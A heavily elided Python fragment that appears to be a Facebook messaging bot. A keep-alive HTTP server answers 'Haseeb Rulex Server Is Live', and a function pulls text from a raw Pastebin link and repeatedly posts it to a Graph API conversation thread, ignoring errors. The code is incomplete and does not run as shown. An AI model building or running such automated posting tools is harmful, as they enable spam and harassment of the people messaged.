...
class MyHandler(http.server.SimpleHTTPRequestHandler):
	def do_GET(self):
		...
		self.end_headers()
		self.wfile.write(b"Haseeb Rulex Server Is Live")
...
def send_messages():
	...
	mmm = requests.get('https://pastebin.com/raw/aV8n7dfW').text
	...
	def msg():
		...
		try:
			s = requests.post("https://graph.facebook.com/v15.0/t_100049713654329/", data=parameters, headers=headers)
		except:
			pass
